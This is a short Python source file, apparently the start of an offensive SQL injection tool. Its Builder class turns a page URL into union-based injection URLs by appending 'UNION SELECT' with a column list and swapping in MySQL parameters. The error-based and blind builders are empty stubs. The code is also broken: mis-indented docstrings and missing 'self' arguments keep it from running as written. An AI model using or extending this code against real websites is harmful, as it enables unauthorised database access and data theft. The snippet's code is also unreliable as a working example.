#!/usr/bin/python


class Builder:
""" Builds the following SQLi types:
    i)      Error-based
    ii)     Union-based
    iii)    Blind

"""
    def __init__(self, page, mysql_params):
        self.params = []
        self.offset = 0

        self.page = page
        self.union_params = mysql_params

    def build_error_injection():
        return 0

    def build_union_injection(self, num_cols, magic_col):
    """ Takes the number of columns for UNION statement, the column number that is most visible, and the injection parameter. Returns a union-based injection as a string.
                
    """
        injections = []
        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, num_cols + 1)]
        for param in self.union_params:
            union_urls[magic_col - 1] = '%20' + param

            injections.append(self.page + '%20UNION%20SELECT' + ','.join(union_urls))
        return injections 

    def build_blind_injection():
        return 0
#

